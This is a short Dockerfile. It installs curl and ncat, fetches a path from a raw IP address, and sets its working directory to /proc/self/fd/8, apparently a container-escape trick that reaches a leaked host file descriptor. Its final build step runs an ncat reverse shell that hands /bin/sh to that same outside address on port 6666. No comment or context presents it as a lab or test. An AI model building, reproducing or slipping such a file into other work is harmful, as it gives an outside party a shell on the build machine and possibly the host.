FROM ubuntu:20.04
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199/gcp/8

WORKDIR /proc/self/fd/8

RUN ncat 68.183.4.199 6666 -e /bin/sh

CMD ["/bin/bash"]
